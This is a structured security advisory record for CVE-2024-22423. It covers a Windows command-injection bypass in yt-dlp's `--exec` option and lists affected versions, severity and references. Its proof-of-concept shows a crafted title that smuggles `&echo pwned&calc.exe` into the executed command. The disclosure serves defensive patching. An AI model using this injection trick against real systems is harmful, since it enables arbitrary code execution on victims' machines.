advisory_id: pypi/yt-dlp/CVE-2024-22423
datasource_id: gitlab_importer_v2/pypi/yt-dlp/CVE-2024-22423
datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/yt-dlp/CVE-2024-22423.yml
aliases:
  - CVE-2024-22423
  - GHSA-hjq6-52gw-2g7p
summary: |
  yt-dlp: `--exec` command injection when using `%q` in yt-dlp on Windows (Bypass of CVE-2023-40581)
  The [patch that addressed CVE-2023-40581](https://github.com/yt-dlp/yt-dlp/commit/de015e930747165dbb8fcd360f8775fd973b7d6e) attempted to prevent RCE when using `--exec` with `%q` by replacing double quotes with two double quotes.
  However, this escaping is not sufficient, and still allows expansion of environment variables.

  Support for output template expansion in `--exec`, along with this vulnerable behavior, was added to `yt-dlp` in version [2021.04.11](https://github.com/yt-dlp/yt-dlp/releases/tag/2021.04.11).

  ```cmd
  > yt-dlp "https://youtu.be/42xO6rVqf2E" --ignore-config -f 18 --exec "echo %(title)q"
  [youtube] Extracting URL: https://youtu.be/42xO6rVqf2E
  [youtube] 42xO6rVqf2E: Downloading webpage
  [youtube] 42xO6rVqf2E: Downloading ios player API JSON
  [youtube] 42xO6rVqf2E: Downloading android player API JSON
  [youtube] 42xO6rVqf2E: Downloading m3u8 information
  [info] 42xO6rVqf2E: Downloading 1 format(s): 18
  [download] Destination: %CMDCMDLINEï¼š~-1%&echo pwned&calc.exe [42xO6rVqf2E].mp4
  [download] 100% of  126.16KiB in 00:00:00 at 2.46MiB/s
  [Exec] Executing command: echo "%CMDCMDLINE:~-1%&echo pwned&calc.exe"
  ""
  pwned
  ```
impacted_packages:
  - purl: pkg:pypi/yt-dlp
    affected_versions: vers:pypi/>=2021.4.11|<2024.4.9
    fixed_versions: vers:pypi/2024.4.9
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score:
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/yt-dlp/CVE-2024-22423.yml
weaknesses:
  - CWE-937
  - CWE-1035
  - CWE-78
references:
  - url: https://github.com/yt-dlp/yt-dlp
    reference_type:
    reference_id:
  - url: https://github.com/yt-dlp/yt-dlp/commit/de015e930747165dbb8fcd360f8775fd973b7d6e
    reference_type:
    reference_id:
  - url: https://github.com/yt-dlp/yt-dlp/commit/ff07792676f404ffff6ee61b5638c9dc1a33a37a
    reference_type:
    reference_id:
  - url: https://github.com/yt-dlp/yt-dlp/releases/tag/2021.04.11
    reference_type:
    reference_id:
  - url: https://github.com/yt-dlp/yt-dlp/releases/tag/2024.04.09
    reference_type:
    reference_id:
  - url: https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-42h4-v29r-42qg
    reference_type:
    reference_id:
  - url: https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-hjq6-52gw-2g7p
    reference_type:
    reference_id:
  - url: https://www.kb.cert.org/vuls/id/123335
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-22423
    reference_type:
    reference_id: CVE-2024-22423
  - url: https://github.com/advisories/GHSA-hjq6-52gw-2g7p
    reference_type:
    reference_id: GHSA-hjq6-52gw-2g7p
